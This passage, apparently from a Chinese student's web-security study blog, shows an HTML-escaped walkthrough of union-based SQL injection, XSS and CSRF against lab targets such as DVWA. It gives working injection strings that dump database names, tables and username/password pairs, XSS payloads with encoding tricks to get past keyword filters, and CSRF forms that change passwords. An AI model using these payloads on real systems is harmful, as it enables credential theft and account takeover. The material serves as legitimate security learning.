    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mysqli_close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$link&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;正常的攻击肯定不只是满足登陆成功, 肯定是想要得到数据库的所有信息才好. 
联想数据库系统的组成, 就会想到爆破的顺序了:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;找到注入点&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?name=admin'&lt;/code&gt;  &lt;br /&gt;
 假如会报错就说明存在注入点, 因为在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php&lt;/code&gt;查询数据库的语句里面, 
 有了类似这样的语句: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;where user_name='admin''&lt;/code&gt;, 所以就会报错, 
 于是暗示着这里有可乘之机. (如果是在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passwd&lt;/code&gt;那里的话, 则不会报错, 
 因为它并没有在sql查询的语句中间. )&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?name=admin' order by 3 -- -&lt;/code&gt;  &lt;br /&gt;
 就是利用排序来检查是否有那么多列数据, 
 比如说&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4&lt;/code&gt;会报错, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3&lt;/code&gt;不会, 那么说明程序涉及的列有3列.&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?name=admin' and length(database())=4-- -&lt;/code&gt;  &lt;br /&gt;
 假如正确返回, 那么&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;database&lt;/code&gt;的(名字?)长度为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?name=error' union select 8, 6, 4-- -&lt;/code&gt;  &lt;br /&gt;
 想法就是瞎填一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name&lt;/code&gt;, 
 让第一次的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;select&lt;/code&gt;查不到值, 然后在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;union&lt;/code&gt;的作用下直接显示后面的信息, 
 现在后面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;select&lt;/code&gt;填什么不重要, 只要填的是个东西, 并且数量对上就好, 
 然后在回显里面看到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password&lt;/code&gt;分别对应的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4&lt;/code&gt;, 
 就可以根据这个就确定返回信息的注入位置.  &lt;br /&gt;
 这个注入点的意思是说, 这个点是可以做手脚的点. 于是可以进行下一步:  &lt;br /&gt;
 (下面假设可以返回的值是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8&lt;/code&gt;, 也就是第一个位置是可以注入的点. )&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?name=error' union select database(), 1, 3-- -&lt;/code&gt;  &lt;br /&gt;
 通过这样的方法就可以在原来输出&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8&lt;/code&gt;的地方输入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;database&lt;/code&gt;的信息.  &lt;br /&gt;
 (下面的方法看起来就是这个方法的利用. )&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;爆库&lt;/strong&gt;  &lt;br /&gt;
  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?name=error' union select 1, group_concat(schema_name), 3 from information_schema.schemata-- -&lt;/code&gt;  &lt;br /&gt;
  想法就是利用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;information_schema&lt;/code&gt;里面放了数据库系统的信息, 把里面的信息给显示出来, 
  就可以看到数据库系统里面有多少个数据库了.  &lt;br /&gt;
  (可以看到里面有一个叫&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;的数据库. )&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;爆表&lt;/strong&gt;  &lt;br /&gt;
  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?name=error' union select 1, group_concat(table_name), 3 from information_schema.tables where table_schema='test'-- -&lt;/code&gt;  &lt;br /&gt;
  在爆库的基础上得到的库名再写入限制里面, 就可以看到数据库&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;里面的表的名字.  &lt;br /&gt;
  (这里显示的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt;)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;爆列&lt;/strong&gt;  &lt;br /&gt;
  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?name=error' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='user'-- -&lt;/code&gt;  &lt;br /&gt;
  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?name=error' union select 1,group_concat(column_name order by column_name desc),3 from information_schema.columns where table_name='user'-- -&lt;/code&gt;  &lt;br /&gt;
  第二个和第一个的区别在于加了一个排序, 理论上来说这两个的返回应该是一样的, 
  但是可能是因为长度的限制? 所以两个的显示都不全, 
  所以通过不同的排序顺序来尝试能否得到想要的东西.  &lt;br /&gt;
  (在第二个的输出里面可以看到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password&lt;/code&gt;的列)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;爆数据&lt;/strong&gt;  &lt;br /&gt;
  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?name=error' union select 8,username,password from user-- -&lt;/code&gt;  &lt;br /&gt;
  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?name=error' union select 8, group_concat(username, 0x7e, password), 4 from user-- -&lt;/code&gt;  &lt;br /&gt;
  第一个的想法比较自然, 但是因为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name=error&lt;/code&gt;的查询方法, 导致了只能显示一行的代码, 
  所以为了让所有的数据都可以显示, 
  用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;group_concat&lt;/code&gt;方法构造了形如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username~password&lt;/code&gt;的输出.  &lt;br /&gt;
  (注: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7e.chr # =&amp;gt; &quot;~&quot;&lt;/code&gt;)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;至此, 这个表里面的数据就得到了, 对于攻击者来说, 用户的数据(用户名和密码)就都知道了.&lt;/p&gt;

&lt;p&gt;(学长的博客里面还有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqlmap&lt;/code&gt;的介绍, 但是我没有用过, 所以这里不写. )&lt;/p&gt;

&lt;h3 id=&quot;盲注方法&quot;&gt;盲注方法&lt;/h3&gt;
&lt;p&gt;一般来说很少有上面例子里面的简单情况, (就是有数据回显的情况)
除非写代码的人专门想要让人来攻击吧?&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;报错注入 - 遇到有报错信息的场景时&lt;/li&gt;
  &lt;li&gt;布尔盲注 - 两种不同返回状态的情况&lt;/li&gt;
  &lt;li&gt;时间盲注 - 上面两种都不好用的时候&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(目前就到这里, 还有很多的方法, 之后再看吧… )&lt;/p&gt;

&lt;h2 id=&quot;xss---cross-site-scripting&quot;&gt;XSS - Cross Site Scripting&lt;/h2&gt;
&lt;p&gt;跨站脚本攻击. 核心的想法就是通过修改用户得到的网页, 插入恶意的脚本, 
来执行不得了的东西, 让用户的信息之类的东西中招.&lt;/p&gt;

&lt;p&gt;重要的特点是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XSS&lt;/code&gt;攻击(主要)发生在用户的客户端client上.&lt;/p&gt;

&lt;p&gt;(感觉这个就是下一个CSRF的基础, 只不过这里主要的介绍都是如何让网页里被塞入一个脚本, 
下面的更多是在注重如何构造这样的一个脚本. )&lt;/p&gt;

&lt;h3 id=&quot;basic&quot;&gt;Basic&lt;/h3&gt;
&lt;p&gt;一般认为能够向网页中引入一段可执行的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;javascript&lt;/code&gt;文件就算是成功的. 
(下面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hook.js&lt;/code&gt;里面就是写着&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;javascript&lt;/code&gt;的脚本, 然后一般是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hook.js&lt;/code&gt;放在某些服务器上, 
并且因为里面可以写各种各样的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;js&lt;/code&gt;代码, 所以可以说几乎可以为所欲为. )&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script src='hook.js'&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt; 这个是最简单的方式, 就是直接写一个脚本了就是&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;svg onload=&quot;document.body.appendChild(document.createElement('script')).src='hook.js'&quot;&amp;gt;&lt;/code&gt; 
这个是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svg&lt;/code&gt;代码, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onload&lt;/code&gt;方法就是可以让其在载入的过程中执行代码.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;img src=x onerror=&quot;document.body.appendChild(document.createElement('script')).src='hook.js'&quot;&amp;gt;&lt;/code&gt; 
这个是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;img&lt;/code&gt;代码, 想法是随便传递一个不存在的图片地址, 然后调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onerror&lt;/code&gt;事件, 
执行里面的代码.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;但是一般在网页url里面写这么多的东西看起来就很可疑, 也不方便用户去点击, 
所以用&lt;strong&gt;短网址&lt;/strong&gt;的技术可以让这个url看起来人畜无害, 更加要人命.&lt;/p&gt;

&lt;h3 id=&quot;三种类型的xss&quot;&gt;三种类型的XSS&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;反射型&lt;/strong&gt; 让用户可以把输入的数据反射给游览器, 在游览器里面渲染显示, 
诱骗用户上当.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;储存型&lt;/strong&gt; 和反射型的区别就是, 一次输入, 长期储存, 方便攻击
(实际上还是和数据库有那么点关系, 因为把恶意的脚本留在了数据库里面了嘛. )  &lt;br /&gt;
常见的例子比如在BBS之类的留言框里面留下脚本, 假如安全措施做得不够好的话, 
就会导致出现XSS的错误.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;DOM Based XSS&lt;/strong&gt; 修改页面的DOM节点形成XSS, 不经过后端.
    &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;TASK&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;decodeURIComponent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;比如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://example.com#%3Cimg%20src=x%20onerror=alert(666)%3E&lt;/code&gt;就是一个例子. 
利用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;url&lt;/code&gt;的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fragment&lt;/code&gt;的小技术.  &lt;br /&gt;
故事大概是这样的: 游览器得到了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;url&lt;/code&gt;, 在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&lt;/code&gt;后面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fragment&lt;/code&gt;不会发送给服务器, 
但在本地因为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt;里面的代码而写进了网页文档里面, 
然后就会被有心人塞一些东西进去. 比如说除了这样的弹窗, 
还可能会塞一些发送用户信息到攻击者的服务器上的代码之类的.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;xss利用编码的攻击&quot;&gt;XSS利用编码的攻击&lt;/h3&gt;
&lt;p&gt;对于这样的XSS攻击, 常用的一个防御手段就是通过屏蔽某些特殊的单词如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;script&lt;/code&gt;之类的东西, 
来防止被攻击.&lt;/p&gt;

&lt;p&gt;但是利用url, js, html的编码的顺序不同和层次的嵌套, 可以构成不同的东西, 
有助于绕过检查关键词:&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript:alert(123)&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;test please 1&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript:alert(&amp;amp;#49;&amp;amp;#50;&amp;amp;#51;)&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;test please 2&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript:\u0061\u006C\u0065\u0072\u0074(&amp;amp;#49;&amp;amp;#50;&amp;amp;#51;)&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;test please 3&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript:alert%28123%29&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;test please 4&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript:\u0061\u006C\u0065\u0072\u0074%28123%29&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;test please 5&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript:\u0061\u006C\u0065\u0072\u0074%28&amp;amp;#49;&amp;amp;#50;&amp;amp;#51;%29&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;test please 6&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript:%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28&amp;amp;#49;&amp;amp;#50;&amp;amp;#51;%29&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;test please 7&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript:%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%26%2349%3B%26%2350%3B%26%2351%3B%29&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;[不会弹窗]test please 8&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript:alert(\u0031\u0032\u0033)&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;[不会弹窗]test please 9&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript:alert('\u0031\u0032\u0033')&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;test please 10&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript:\u0061\u006C\u0065\u0072\u0074('\u0031\u0032\u0033')&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;test please 11&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript:alert%28%27%5Cu0031%5Cu0032%5Cu0033%27%29&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;test please 12&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript:%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%27%5Cu0031%5Cu0032%5Cu0033%27%29&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;test please 13&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;csrf---cross-site-request-forgery&quot;&gt;CSRF - Cross Site Request Forgery&lt;/h2&gt;
&lt;p&gt;跨站点请求伪造, 感觉和XSS很像, 都是在用户的游览器(client)部分做手脚, 
用用户的游览器去执行请求, 因为在用户的游览器上可能还留有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cookie&lt;/code&gt;等信息, 
会让其有一定的权限, 所以就会中招.&lt;/p&gt;

&lt;p&gt;(一个不知道合不合理的比喻: 用户的手里有一把权限很高的剑, 
然后我们骗用户去做一些无关的事情(访问一个有问题的网站), 
但是实际上是在让用户挥剑砍自己. 相当于是利用了网站对用户游览器的信任, 
让游览器去执行不是用户本意的操作. )&lt;/p&gt;

&lt;p&gt;感觉一般会配合XSS出动的样子, 利用的就是可以进行网页访问的组件, 比如可以&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt;, 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt;之类的东西.&lt;/p&gt;

&lt;h3 id=&quot;dvwa靶场&quot;&gt;DVWA靶场&lt;/h3&gt;
&lt;p&gt;用的靶场是DVWA.&lt;/p&gt;

&lt;h3 id=&quot;简单的get和post---low&quot;&gt;简单的GET和POST - low&lt;/h3&gt;
&lt;p&gt;观察网页, 就会发现实际上修改数据库里面的密码就是通过一个GET方法的提交实现的, 
所以任何的时候, (只要这个游览器带有表示自己是自己人的cookie)去访问这个链接, 
就会导致密码被修改的悲剧.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;GET&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=1&amp;amp;password_conf=1&amp;amp;Change=Change&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;hidden=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;POST&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password_new&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password_conf&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
